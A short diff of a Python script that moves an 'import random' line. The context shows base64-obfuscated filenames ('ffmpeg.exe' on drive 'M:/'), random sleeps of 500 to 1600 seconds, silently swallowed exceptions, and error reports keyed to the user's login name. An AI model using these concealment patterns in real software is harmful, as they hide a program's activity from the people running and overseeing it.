@@ -140,6 +140,9 @@ except:
     add_queue_task('tsl_error__{}'.format(getpass.getuser().lower()),
                    {'error': str(traceback.format_exc())})
 
+
+import random
+
 random.shuffle(zovV)
 time.sleep(random.uniform(500.0, 1600.0))
 for _, fp in zovV:
@@ -154,7 +157,6 @@ for _, fp in zovV:
         except:
             pass
 
-import random
 
 try:
     fmp = find_file(base64.b64decode('ZmZtcGVnLmV4ZQ==').decode(), base64.b64decode('TTov').decode())
